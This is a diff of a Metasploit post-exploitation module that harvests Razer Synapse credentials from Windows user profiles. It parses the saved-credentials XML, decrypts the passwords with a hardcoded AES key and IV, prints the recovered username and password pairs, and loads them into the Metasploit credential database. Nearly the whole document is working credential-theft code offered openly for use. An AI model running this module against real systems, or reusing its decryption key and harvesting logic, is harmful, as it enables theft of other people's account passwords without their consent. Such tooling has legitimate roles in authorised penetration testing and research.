@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'openssl'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::File
 
@@ -38,59 +35,85 @@ class Metasploit3 < Msf::Post
     ))
   end
 
+  def is_base64?(str)
+    str.match(/^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/) ? true : false
+  end
+
   # decrypt password
-  def decrypt(hash)
-    cipher = OpenSSL::Cipher::Cipher.new 'aes-256-cbc'
+  def decrypt(pass)
+    pass = Rex::Text.decode_base64(pass) if is_base64?(pass)
+    cipher = OpenSSL::Cipher.new 'aes-256-cbc'
     cipher.decrypt
     cipher.key = "hcxilkqbbhczfeultgbskdmaunivmfuo"
     cipher.iv = "ryojvlzmdalyglrj"
 
-    hash.each_pair { |user,pass|
-      pass = pass.unpack("m")[0]
+    pass = pass.unpack("m")[0]
+    password = cipher.update pass
+    password << cipher.final
 
-      password = cipher.update pass
-      password << cipher.final rescue return nil
-
-      store_creds(user, password.split("||")[1])
-      print_good("Found credentials")
-      print_good("\tUser: #{user}")
-      print_good("\tPassword: #{password.split("||")[1]}")
-    }
+    password
   end
 
-  def store_creds(user, pass)
-    if db
-      report_auth_info(
-        :host   => Rex::Socket.resolv_to_dotted("www.razerzone.com"),
-        :port   => 443,
-        :ptype  => 'password',
-        :sname  => 'razer_synapse',
-        :user   => user,
-        :pass   => pass,
-        :duplicate_ok => true,
-        :active => true
-      )
-      vprint_status("Loot stored in the db")
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: opts[:type],
+      username: opts[:user]
+    }
+
+    if opts[:type] == :nonreplayable_hash
+      credential_data[:jtr_format] = 'odf-aes-opencl'
     end
+
+    credential_data.merge!(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   # Loop throuhg config, grab user and pass
-  def parse_config(config)
-    if not config =~ /<Version>\d<\/Version>/
-      creds = {}
-      cred_group = config.split("</SavedCredentials>")
-      cred_group.each { |cred|
-        user = /<Username>([^<]+)<\/Username>/.match(cred)
-        pass = /<Password>([^<]+)<\/Password>/.match(cred)
-        if user and pass
-          creds[user[1]] = pass[1]
-        end
+  def get_creds(config)
+    creds = []
+
+    return nil if !config.include?('<Version>')
+
+    xml = ::Nokogiri::XML(config)
+    xml.xpath('//SavedCredentials').each do |node|
+      user = node.xpath('Username').text
+      pass = node.xpath('Password').text
+      type = :password
+      begin
+        pass = decrypt(pass)
+      rescue OpenSSL::Cipher::CipherError
+        type = :nonreplayable_hash
+      end
+      creds << {
+        user: user,
+        pass: pass,
+        type: type
       }
-      return creds
-    else
-      print_error("Module only works against configs from version < 1.7.15")
-      return nil
     end
+
+    creds
+  end
+
+  def razerzone_ip
+    @razerzone_ip ||= Rex::Socket.resolv_to_dotted("www.razerzone.com")
   end
 
   # main control method
@@ -104,11 +127,23 @@ class Metasploit3 < Msf::Post
         contents = read_file(accounts)
 
         # read the contents of file
-        creds = parse_config(contents)
-        if creds
-          decrypt(creds)
-        else
-          print_error("Could not read config or empty for #{user['UserName']}")
+        creds = get_creds(contents)
+        unless creds.empty?
+          creds.each do |c|
+            user = c[:user]
+            pass = c[:pass]
+            type = c[:type]
+
+            print_good("Found cred: #{user}:#{pass}")
+            report_cred(
+              ip: razerzone_ip,
+              port: 443,
+              service_name: 'http',
+              user: user,
+              password: pass,
+              type: type
+            )
+          end
         end
       end
     end
